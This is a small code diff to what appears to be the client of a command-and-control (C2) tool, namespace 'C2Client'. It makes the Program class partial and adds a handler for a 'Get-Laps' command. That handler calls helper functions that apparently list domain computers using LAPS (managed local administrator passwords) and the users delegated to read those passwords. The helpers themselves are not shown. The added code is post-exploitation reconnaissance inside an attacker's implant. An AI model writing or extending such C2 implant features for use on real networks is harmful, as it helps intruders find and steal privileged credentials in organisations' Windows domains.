@@ -28,7 +28,7 @@ using System.Windows.Forms;
 
 namespace C2Client
 {
-    class Program
+    public partial class Program
     {
         public enum TOKEN_INFORMATION_CLASS
         {
@@ -1550,6 +1550,15 @@ namespace C2Client
                         }
                     }
 
+
+
+                    else if (cmd.Contains("Get-Laps"))
+                    {
+
+                        cmd = winapi.GetLapsComputers();
+                        cmd += winapi.GetLapsDelegatedUsers();
+
+                    }
 
                     else
                     {
